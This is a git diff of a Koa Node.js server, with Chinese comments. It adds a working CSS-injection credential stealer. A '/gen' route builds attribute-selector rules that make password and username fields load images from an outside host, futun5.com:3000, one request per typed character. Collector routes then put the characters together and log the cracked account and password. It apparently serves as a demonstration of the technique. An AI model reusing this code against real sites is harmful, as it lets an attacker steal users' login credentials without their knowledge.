@@ -18,7 +18,8 @@ const fs = require('fs');
 // 静态资源目录对于相对入口文件server.js的路径
 const staticPath = path.join(__dirname, './nodeviews');
 // 装载路由
-app.use(logger())
+app
+    // .use(logger())
     .use(UserAgent)
     .use(bodyParser({
     }))
@@ -43,11 +44,27 @@ let db = {
     }
 };
 
+let user  = '';
+let pwd = '';
+
 // 配置路由
 let router = new Router();
 router.get('/input', async (ctx) => {
     await ctx.render('input.html', {
         data: 'test'
+    });
+}).get('/gen', async (ctx) => {
+    let str = '';
+    let str2 = '';
+    for (var i = 48; i <= 122; i++) {
+        let char = String.fromCharCode(i);
+        str += `input[type="password"][value$="${char}"] { background-image: url("http://www.futun5.com:3000/pwd/${char}"); }`;
+        str2 += `input[type="text"][value$="${char}"] { background-image: url("http://www.futun5.com:3000/user/${char}"); }`;
+    }
+    ctx.set("Content-Type", "application/json")
+    ctx.body = JSON.stringify({
+        pwd: str,
+        user: str2
     });
 }).get('/view', async (ctx) => {
     let data = db.get();
@@ -77,6 +94,25 @@ router.get('/input', async (ctx) => {
 }).post('/save', async (ctx) => {
     db.set(ctx.request.body.name);
     await ctx.redirect('/view');
+}).get('/pwd/:char', async (ctx) => {
+    pwd += ctx.params.char;
+    if (pwd.length === 6 && user.length === 6){
+        console.log(`已破解：账号：${user},密码：${pwd}`);
+        pwd = '';
+        user = '';
+    }
+}).get('/user/:char', async (ctx) => {
+    user += ctx.params.char;
+    if (pwd.length === 6 && user.length === 6) {
+        console.log(`已破解：账号：${user},密码：${pwd}`);
+        pwd = '';
+        user = '';
+    }
+    ctx.set('Cache-Control', 'no-cache, no-store, must-revalidate');
+    ctx.status = 200;
+    ctx.type = 'jpg';
+    ctx.length = 0;
+    ctx.body = Buffer.from('');
 });
 
 app.use(router.routes())
